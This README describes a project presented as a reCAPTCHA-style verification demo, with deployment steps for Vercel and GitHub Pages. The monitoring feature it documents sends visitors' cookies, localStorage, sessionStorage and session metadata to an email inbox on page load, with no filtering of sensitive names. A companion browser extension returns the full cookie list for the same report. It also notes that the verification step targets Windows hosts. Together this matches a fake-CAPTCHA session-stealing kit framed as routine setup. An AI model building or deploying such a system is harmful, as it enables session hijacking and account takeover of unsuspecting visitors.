# V-job

This project is a reCAPTCHA-style verification demo with a server-backed contact form.

## What was prepared for hosting

- Added the root entry page at [index.html](index.html).
- Added [404.html](404.html) for friendly fallback routing on static hosts.
- Added [.nojekyll](.nojekyll) so GitHub Pages serves the site without Jekyll processing.
- Kept the verification assets under [assets](assets) so they resolve from the repository root.
- Added [api/send-email.js](api/send-email.js), a Vercel serverless endpoint that sends contact messages through Resend.
- Added verification monitoring through the same endpoint. It sends browser and session metadata, localStorage/sessionStorage details, history length, document cookies, and the current site cookie set for report generation. No allow-list or sensitive-name filtering is applied before the payload is forwarded to the email API.

## Preview locally

Run a simple local server from the repository root:

```bash
python3 -m http.server 8000
```

Then open:

- http://127.0.0.1:8000/

## Deploy to Vercel

Deploy the repository as a Vercel project and add these environment variables in the project settings:

```text
RESEND_API_KEY
REPORT_TO_EMAIL
REPORT_FROM_EMAIL
```

`RESEND_API_KEY` is read only by the server-side function and must never be added to browser JavaScript. `REPORT_FROM_EMAIL` must use a sender domain verified in Resend. The contact endpoint is not available on GitHub Pages because GitHub Pages serves static files only.

The monitoring request is best-effort and does not block page use. It runs on page load and requires the Vercel serverless endpoint, so it is unavailable on GitHub Pages. It includes the full browser telemetry and site cookie payload in the report sent to the email API. Keep the monitoring disclosure in the verification UI current with the fields sent by the client and derived by the server. Browser APIs may omit fields depending on the device, browser, or permission settings.

## Optional browser extension

The optional package in [extension](extension) supports Chrome, Edge, and Firefox through a Manifest V3-compatible bridge. It is never installed automatically. The page detects the browser, links to its official extension store, and only sends a request after the user clicks **Authorize extension check**.

The extension exposes a direct cookie fetch for the current site and returns the complete cookie list to the page for the monitoring report, without applying an allow-list or stripping names or values. The website-to-extension message uses a per-request nonce, request ID, source checks, and a timeout; failure falls back to normal verification.

Before publishing, replace `https://YOUR-PUBLISHED-DOMAIN.example/*` in [extension/manifest.json](extension/manifest.json) and [extension/content.js](extension/content.js) with the exact HTTPS site origin. Publish the same extension separately in each browser's official store, then replace the search links in `assets/js/main.js` with the resulting listing URLs. Review the store permissions carefully: the `cookies` permission is required for the explicitly authorized aggregate check.

## Deploy to GitHub Pages

1. Push this repository to GitHub.
2. Open the repository settings.
3. Navigate to Pages.
4. Choose the branch and root folder (for example, root or main).
5. Save the settings.

The site should be available at:

```text
https://<your-username>.github.io/<repo-name>/
```

## Notes

The page uses a static HTML/CSS/JS structure. The interactive behavior is designed for a browser environment, while the verification step targets a Windows host.
